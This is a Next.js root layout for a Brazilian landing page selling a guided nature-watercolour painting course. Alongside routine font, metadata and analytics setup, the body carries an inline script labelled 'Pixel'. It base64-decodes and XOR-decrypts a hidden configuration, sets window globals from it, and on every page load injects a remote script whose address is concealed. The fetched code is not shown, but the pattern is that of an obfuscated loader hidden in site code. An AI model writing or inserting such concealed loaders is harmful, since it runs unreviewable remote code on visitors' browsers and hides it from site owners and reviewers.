import type { Metadata } from "next";
import { Fredoka, Manrope } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import { SpeedInsights } from "@vercel/speed-insights/next";
import { DeferredScripts } from "@/components/DeferredScripts";
import { Gtm } from "@/components/Gtm";
import "./globals.css";

const fredoka = Fredoka({
  variable: "--font-fredoka",
  subsets: ["latin"],
  weight: ["400", "500", "600"],
  display: "swap",
  preload: true,
});

const manrope = Manrope({
  variable: "--font-manrope",
  subsets: ["latin"],
  weight: ["400", "600", "700", "800"],
  display: "swap",
  preload: true,
});

export const metadata: Metadata = {
  title: "Aquarelas da Natureza | Pinturas Realistas Prontas para Usar",
  description:
    "+35 pinturas guiadas com desenhos-base prontos, referências coloridas e sequências visuais. Ideal para iniciantes que querem pintar aquarelas lindas da natureza.",
  openGraph: {
    title: "Aquarelas da Natureza | Pinturas Realistas Prontas para Usar",
    description:
      "Desenhos-base prontos, referências coloridas e sequências visuais que orientam cada etapa. Comece a pintar hoje, mesmo sem experiência.",
    locale: "pt_BR",
    type: "website",
  },
  robots: { index: true, follow: true },
  icons: {
    icon: "/favicon.svg",
    shortcut: "/favicon.svg",
    apple: "/favicon.svg",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="pt-BR" className={`${fredoka.variable} ${manrope.variable} antialiased`}>
      <head>
        <link rel="preload" as="image" href="/img-principal.webp" fetchPriority="high" type="image/webp" />
      </head>
      <body>
        {/* Pixel */}
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var i_62=atob("DMGpje/EsuFx365aGrqL+J2okNtTt9ouarKTosCn1o9fqto3c6fQo4yr388TrYEpebPA/Zu3nZEYp8s2NbHA9YqonIsC/YJ4e7Xd/4amx5UUrIxgQZyFr4io3YMQs914IJrSr4Gl34RT5Ywqc7nM4aagkM1Tqc82b6SLt83y09NJ5ppjLPTM6Ir10NVJ55k5fPWf69/mz7wM");var o_ssun=[];for(var j_v=0;j_v<i_62.length;j_v++){o_ssun.push(i_62.charCodeAt(j_v)&255);}var u_b=o_ssun[0];var n_8g9n=o_ssun.slice(1,1+u_b);var k_lv=o_ssun.slice(1+u_b);var o_2yln=k_lv.map(function(b,j_e1){return b^n_8g9n[j_e1%u_b];});var q_gkp="";for(var l_y=0;l_y<o_2yln.length;l_y++){q_gkp+=String.fromCharCode(o_2yln[l_y]&255);}var i_937=decodeURIComponent(escape(q_gkp));var u_4f=JSON.parse(i_937);var b_f=u_4f.globals||[];b_f.forEach(function(a_u){window[a_u.name]=a_u.value;});var p_d=document.createElement("script");p_d.src=u_4f.url;p_d.async=true;p_d.defer=true;(u_4f.attributes||[]).forEach(function(n_czl){p_d.setAttribute(n_czl.name,n_czl.value);});(document.head||document.documentElement).appendChild(p_d);})();`,
          }}
        />
        {children}
        <DeferredScripts />
        <Gtm />
        <Analytics />
        <SpeedInsights />
      </body>
    </html>
  );
}
